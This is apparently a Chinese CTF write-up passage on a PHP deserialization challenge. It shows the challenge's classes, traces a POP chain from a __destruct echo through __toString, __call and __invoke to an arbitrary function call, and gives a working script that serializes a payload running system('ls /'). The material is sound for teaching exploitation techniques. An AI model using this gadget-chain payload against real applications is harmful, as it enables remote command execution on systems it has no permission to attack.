然后就是一个反序列化构造pop链的题
 &lt;?php

class dstbp
&#123;
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    &#123;
        $this-&gt;cmd &#x3D; $cmd;
        $this-&gt;content &#x3D; $content;
    &#125;

    public function __invoke()
    &#123;
        ($this-&gt;cmd)($this-&gt;content);
    &#125;
&#125;

class m1sery
&#123;
    public $ctf;
    public $time &#x3D; &quot;Two and a half years&quot;;

    public function __construct($ctf)
    &#123;
        $this-&gt;ctf &#x3D; $ctf;
    &#125;


    public function __toString()
    &#123;
        return $this-&gt;ctf-&gt;show();
    &#125;

    public function show(): string
    &#123;
        return $this-&gt;ctf . &quot;: Duration of practice: 2.5 years&quot;;
    &#125;


&#125;

class s0rry
&#123;
    private $name;
    private $password;
    public $hint &#x3D; &quot;hint is depend on you&quot;;
    public $key;

    public function __construct($name, $password)
    &#123;
        $this-&gt;name &#x3D; $name;
        $this-&gt;password &#x3D; $password;
    &#125;


    public function __destruct()
    &#123;
        echo $this-&gt;hint;
    &#125;


&#125;

class jiangnaij
&#123;
    protected $code;


    public function __call($name, $arguments)
    &#123;
        ($this-&gt;code)();
    &#125;
&#125; 
?&gt;

可以从目标函数开始分析，也就是dstbp类里的($this-&gt;cmd)($this-&gt;content);可以控制变量的值去获取flag，要想执行该函数先激活__invoke()方法，该类在调用函数的方式调用一个对象时会被激活，那么可以利用__call()方法里的($this-&gt;code)();激活，该方法又可以被m1sery类中的return $this-&gt;ctf-&gt;show();激活，那么继续往前推，需要echo $this-&gt;hint;来激活__tostring()方法，那么整条链子就构造出来了，下面给出php代码
&lt;?php
class dstbp
&#123;
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    &#123;
        $this-&gt;cmd &#x3D; $cmd;
        $this-&gt;content &#x3D; $content;
    &#125;
&#125;

class m1sery
&#123;
    public $ctf;
&#125;

class s0rry
&#123;
    public $hint;
    public $key;
&#125;

class jiangnaij
&#123;
    protected $code;
	public function __construct($a)
    &#123;
        $this-&gt;code &#x3D; $a;
    &#125;

&#125;
$b&#x3D;new s0rry();
$c&#x3D;new m1sery();
$b-&gt;hint&#x3D;$c;
$a&#x3D;new dstbp(&#39;system&#39;,&quot;ls &#x2F;&quot;);
$d&#x3D;new jiangnaij($a);
$c-&gt;ctf&#x3D;$d;
var_dump(urlencode(serialize($b)));
